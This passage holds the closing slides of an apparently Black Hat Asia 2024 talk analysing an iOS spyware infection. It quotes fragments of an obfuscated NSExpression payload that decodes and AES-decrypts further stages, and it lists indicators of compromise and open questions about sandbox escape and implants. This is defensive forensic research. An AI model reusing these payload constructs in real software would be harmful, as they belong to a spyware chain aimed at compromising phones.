TERNARY(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread') ['a02bb2d41a4a6c3a']<100&&FUNCTION(CAST('NSDate','Class'),'mt_millisecondsSince1970')<FUNCTION(CAST('OCM apper','Class'),'mapperForCurrentThread')['af84949d6657831d'],

*…*

FUNCTION(0,'hash',FUNCTION(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread'),'setValue:forKey:',FU NCTION(FUNCTION(CAST('NSData','Class'),'alloc'),'initWithBase64EncodedData:options:',FUNCTION(CAST('OCMappe r','Class'),'mapperForCurrentThread')['x'],nil),'a2888b59b5914536'))

*…*

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

# BHASIA   @BlackHatEvents

## Slide 144

## **PERFECT!** 😎

**4**

# BHASIA   @BlackHatEvents

## Slide 145

##### **Compressed Payload inside Payload**

###### **NSLog(@"Decompressed String: %@", payloadInsidePayload);**

###### Payload-X!

Encrypted!

TERNARY(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread') ['a02bb2d41a4a6c3a']<100&&FUNCTION(CAST('NSDate','Class'),'mt_millisecondsSince1970')<FUNCTION(CAST('OCM apper','Class'),'mapperForCurrentThread')['af84949d6657831d'],

*…*

FUNCTION(0,'hash',FUNCTION(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread'),'setValue:forKey:',FU NCTION(FUNCTION(CAST('NSData','Class'),'alloc'),'initWithBase64EncodedData:options:',FUNCTION(CAST('OCMappe r','Class'),'mapperForCurrentThread')['x'],nil),'a2888b59b5914536'))

*…*

FUNCTION(FUNCTION(CAST('OCMapper','Class'),'mapperForCurrentThread'),'setValue:forKey:',FUNCTION(FUNCTION (CAST('OCMapper','Class'),'mapperForCurrentThread')

['a2888b59b5914536'],'fc_decryptAESSIVWithKey:additionalData:',FUNCTION(CAST('OCMapper','Class'),'mapperForCur rentThread')['a22990eb91e7ea79'],nil),'abc310bdbde1a724')

**Payload-CS**

**Payload-C**

**Payload**

**Payload-X**

# BHASIA   @BlackHatEvents

## Slide 146

## 😫 **No Key in clear sight**

# BHASIA   @BlackHatEvents

## Slide 147

# BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
piQichat Uncovering
Paylo ad
Payload Analysis
#BHASIA @BlackHatEvents
```

## Slide 148

# BHASIA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ee ee Uncovering
ASIA 2024
‘AG
Call, ; d
YOU SHALL NOT PASS!
```

## Slide 149

## **Is this the end?**

# BHASIA   @BlackHatEvents

## Slide 150

## **Maybe…**

# BHASIA   @BlackHatEvents

## Slide 151

## **But there is more to discover!**

# BHASIA   @BlackHatEvents

## Slide 152

## **Homed Crashes?**

# BHASIA   @BlackHatEvents

## Slide 153

## **NSExpression Bypass?**

# BHASIA   @BlackHatEvents

## Slide 154

## **Sandbox Escape?**

# BHASIA   @BlackHatEvents

## Slide 155

## **PAC Bypass?**

# BHASIA   @BlackHatEvents

## Slide 156

## **Implant?**

# BHASIA   @BlackHatEvents

## Slide 157

## **Command & Control Structure?**

# BHASIA   @BlackHatEvents

## Slide 158

## **To be continued…**

# BHASIA   @BlackHatEvents

## Slide 159

##### **Summary**

**MessagesBlastDoorCrashes**

**Backup IMTransferAgent sample.pkpass logo.png Config Payload-CS Payload NSExpression Ref 11 plist Payload Payload-C Payload-X Payload Encrypted Payload**

**logo.png**

**Payload**

# BHASIA   @BlackHatEvents

## Slide 160

Summary - IOCs
PNG != WebP
MessagesBlastDoorCrashes Backup IMTransferAgent sample.pkpass logo.png
Config FUNCTION(…
Payload-CS Payload NSExpression Ref 11 plist
AAAAAAAAAA
Payload Payload-C
Payload-X Payload
Encrypted
Payload
Payload # BHASIA   @BlackHatEvents

# BHASIA   @BlackHatEvents

## Slide 161

##### **Summarised Open Questions**

- **1** How was NSExpression executed?

- **2** Bypass NSExpression mitigations?

- **3** Encryption Key?

- **4** Sandbox Escape, Mitigation Bypasses?

- **5** Command & Control Structure?

- **6** Implant?

- **7** Homed Crashes?

# BHASIA   @BlackHatEvents

## Slide 162

## **If you got an Apple Threat Notification If you believe your iPhone is compromised And you need help**

## **Please contact us at** **<u>info@iverify.io!</u>**

# BHASIA   @BlackHatEvents

## Slide 163

### **Black Hat Asia Sound Bytes**

##### **1** iOS Forensic investigation works! We need more scale!

- iOS Vulnerability Mitigations are bypassed with more

- **2** Vulnerabilities

##### Spyware vendors tend to reuse (very complex) **3** Exploitation Frameworks

# BHASIA   @BlackHatEvents
